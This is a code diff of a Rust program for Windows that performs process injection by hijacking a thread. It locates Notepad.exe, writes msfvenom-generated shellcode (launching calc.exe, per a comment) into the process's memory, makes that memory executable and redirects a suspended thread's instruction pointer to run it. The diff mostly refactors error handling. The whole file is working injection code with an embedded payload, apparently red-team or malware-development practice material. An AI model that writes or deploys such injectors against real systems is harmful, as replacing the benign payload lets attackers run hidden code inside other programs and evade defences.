@@ -1,89 +1,33 @@
-use std::{mem::size_of, process::exit, ptr::null};
+use std::mem::size_of;
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows::Win32::System::Memory::{
-    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-};
-use windows::Win32::System::Threading::{
-    OpenThread, ResumeThread, WaitForSingleObject, INFINITE, THREAD_ALL_ACCESS,
-};
-use windows::Win32::System::{
-    Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT},
-    Threading::SuspendThread,
-};
 use windows::Win32::System::{
     Diagnostics::{
-        Debug::WriteProcessMemory,
+        Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT},
         ToolHelp::{
             CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
         },
     },
-    Threading::{OpenProcess, PROCESS_ALL_ACCESS},
+    Memory::{
+        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+    },
+    Threading::{
+        OpenProcess, OpenThread, ResumeThread, SuspendThread, WaitForSingleObject, INFINITE,
+        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
+    },
 };
 use windows::Win32::{Foundation::HANDLE, System::Diagnostics::Debug::CONTEXT_ALL_AMD64};
 
-fn find_process(name: &str) -> Result<(HANDLE, u32), String> {
-    let mut system = System::new_all();
-    system.refresh_all();
 
-    for (pid, process) in system.processes() {
-        if process.name() == name {
-            let pid = pid.as_u32();
-            let hprocess = unsafe {
-                OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap_or_else(|e| {
-                    eprintln!("[!] OpenProcess Failed With Error: {e}");
-                    exit(-1);
-                })
-            };
-
-            return Ok((hprocess, pid));
-        }
-    }
-
-    return Err(String::from(
-        "[!] Error getting the process handle of the current process",
-    ));
+// https://github.com/microsoft/win32metadata/issues/1044
+#[repr(align(16))]
+#[derive(Default)]
+struct AlignedContext {
+    ctx: CONTEXT
 }
 
-fn find_thread(process_pid: u32) -> Result<HANDLE, String> {
-    unsafe {
-        let hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).unwrap_or_else(|e| {
-            eprintln!("[!] CreateToolhelp32Snapshot Failed With Error: {e}");
-            exit(-1);
-        });
-
-        let mut thr = THREADENTRY32::default();
-        thr.dwSize = size_of::<THREADENTRY32>() as u32;
-
-        Thread32First(hsnap, &mut thr).unwrap_or_else(|e| {
-            eprintln!("[!] Thread32First Failed With Error: {e}");
-            exit(-1);
-        });
-
-        loop {
-            if thr.th32OwnerProcessID == process_pid {
-                let h_thread = OpenThread(THREAD_ALL_ACCESS, false, thr.th32ThreadID)
-                    .unwrap_or_else(|e| {
-                        eprintln!("[!] OpenThread Failed With Error: {e}");
-                        exit(-1);
-                    });
-
-                return Ok(h_thread);
-            }
-
-            if Thread32Next(hsnap, &mut thr).is_err() {
-                break;
-            }
-        }
-
-        return Err(String::from(
-            "[!] Error getting the thread handle of the current process",
-        ));
-    }
-}
-
-fn main() {
-    // msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
+fn main() -> Result<(), String> {
+    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
         0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
@@ -105,42 +49,45 @@ fn main() {
         0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
-    unsafe {
-        println!("[+] Searching for the process handle");
-        let process = find_process("Notepad.exe").unwrap_or_else(|e| {
-            eprintln!("[!] find_process Failed With Error: {e}");
-            exit(-1);
-        });
-        let hprocess = process.0;
-        let pid = process.1;
 
-        println!("[+] Searching for the thread handle");
-        let hthread = find_thread(pid).unwrap_or_else(|e| {
-            eprintln!("[!] find_thread Failed With Error: {e}");
-            exit(-1);
-        });
+    println!("[+] Searching for the process handle");
+    let process = find_process("Notepad.exe")?;
 
-        let address = VirtualAllocEx(
-            hprocess,
-            Some(null()),
-            shellcode.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
+    let hprocess = process.0;
+    let pid = process.1;
 
-        println!("[+] Writing the shellcode");
+    println!("[+] Searching for the thread handle");
+    let hthread = find_thread(pid)?;
+
+    let address = unsafe { 
+        VirtualAllocEx(
+        hprocess,
+        None,
+        shellcode.len(),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    )};
+
+    if address.is_null() {
+        return Err("VirtualAllocEx failed".to_string());
+    }
+
+    println!("[+] Writing the shellcode");
+    let mut return_len = 0;
+    unsafe { 
         WriteProcessMemory(
             hprocess,
             address,
             shellcode.as_ptr() as _,
             shellcode.len(),
-            None,
+            Some(&mut return_len),
         ).unwrap_or_else(|e| {
-            eprintln!("[!] WriteProcessMemory Failed With Error: {e}");
-            exit(-1);
-        });
+            panic!("[!] WriteProcessMemory Failed With Error: {e}");
+        })
+    };
 
-        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
+    let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
+    unsafe { 
         VirtualProtectEx(
             hprocess,
             address,
@@ -148,35 +95,82 @@ fn main() {
             PAGE_EXECUTE_READWRITE,
             &mut oldprotect,
         ).unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtectEx Failed With Error: {e}");
-            exit(-1);
-        });
+            panic!("[!] VirtualProtectEx Failed With Error: {e}");
+        })
+    };
 
-        let mut ctx_thread = CONTEXT::default();
-        ctx_thread.ContextFlags = CONTEXT_ALL_AMD64;
+    let mut ctx_thread = AlignedContext {
+        ctx: CONTEXT {
+            ContextFlags: CONTEXT_ALL_AMD64,
+            ..Default::default()
+        }
+    };
 
-        SuspendThread(hthread);
+    println!("[+] Stopping the thread");
+    unsafe { SuspendThread(hthread); }
 
-        println!("[+] Retrieving thread context");
-        GetThreadContext(hthread, &mut ctx_thread).unwrap_or_else(|e| {
-            eprintln!("[!] GetThreadContext Failed With Error: {e}");
-            exit(-1);
-        });
+    println!("[+] Retrieving the thread context");
+    unsafe { 
+        GetThreadContext(hthread, &mut ctx_thread.ctx).unwrap_or_else(|e| {
+            panic!("[!] GetThreadContext Failed With Error: {e}");
+        })
+    };
 
-        ctx_thread.Rip = address as u64;
+    ctx_thread.ctx.Rip = address as u64;
 
-        println!("[+] Setting the thread context");
-        SetThreadContext(hthread, &ctx_thread).unwrap_or_else(|e| {
-            eprintln!("[!] SetThreadContext Failed With Error: {e}");
-            exit(-1);
-        });
+    println!("[+] Setting the thread context");
+    unsafe { 
+        SetThreadContext(hthread, &ctx_thread.ctx).unwrap_or_else(|e| {
+            panic!("[!] SetThreadContext Failed With Error: {e}");
+        })
+    };
 
-        ResumeThread(hthread);
+    println!("[+] Thread Executed!");
+    unsafe { ResumeThread(hthread); }
 
-        println!("[+] Thread Executed!");
+    unsafe { WaitForSingleObject(hthread, INFINITE); }
 
-        WaitForSingleObject(hthread, INFINITE);
+    Ok(())
+}
+
+fn find_process(name: &str) -> Result<(HANDLE, u32), String> {
+    let system = System::new_all();
+    system.processes()
+        .iter()
+        .find_map(|(pid, proc)| {
+            if proc.name() == name {
+                unsafe {
+                    OpenProcess(PROCESS_ALL_ACCESS, false, pid.as_u32())
+                        .map(|handle| Some((handle, pid.as_u32())))
+                        .map_err(|_| "Failed to open process".to_string())
+                        .transpose()
+                }
+            } else {
+                None
+            }
+        }).unwrap_or_else(|| Err("Process not found".to_string()))
+}
+
+fn find_thread(pid: u32) -> Result<HANDLE, String> {
+    let snapshot =  unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).map_err(|_| "Failed to create snapshot".to_string())? };
+    let mut entry = THREADENTRY32 {
+        dwSize: size_of::<THREADENTRY32>() as u32,
+        ..Default::default()
+    };
+
+    if unsafe { Thread32First(snapshot, &mut entry).is_ok() } {
+        loop {
+            if entry.th32OwnerProcessID == pid {
+                return unsafe {  OpenThread(THREAD_ALL_ACCESS, false, entry.th32ThreadID)
+                    .map_err(|_| "Failed to open thread".to_string()) };
+            }
+
+            if unsafe { Thread32Next(snapshot, &mut entry).is_err() } {
+                break;
+            }
+        }
     }
+    Err("Thread not found".to_string())
 }
 
 // Example of a function to create a thread
